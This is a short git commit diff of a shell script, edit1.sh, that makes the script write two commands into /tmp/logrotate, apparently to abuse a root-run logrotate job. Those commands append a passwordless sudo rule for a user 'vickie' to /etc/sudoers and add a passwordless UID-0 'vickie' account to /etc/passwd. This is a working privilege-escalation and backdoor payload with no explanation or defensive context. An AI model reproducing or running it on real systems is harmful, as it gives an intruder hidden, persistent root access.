77372058b398824194cc2ef4f0c0b9c129b8cafd
kovaliv1990 <127501891+kovaliv1990@users.noreply.github.com>
2023-03-17 19:56:14 +0200

    Update edit1.sh

--- edit1.sh
+++ edit1.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-'echo '\''vickie ALL=(ALL) NOPASSWD:ALL'\'' >> /etc/sudoers' >> /tmp/logrotate
-'echo '\''vickie::0:0:System Administrator:/root/root:/bin/bash'\'' >> /etc/passwd'  >> /tmp/logrotate
+echo "echo 'vickie ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" >> /tmp/logrotate
+echo "echo 'vickie::0:0:System Administrator:/root/root:/bin/bash' >> /etc/passwd"  >> /tmp/logrotate
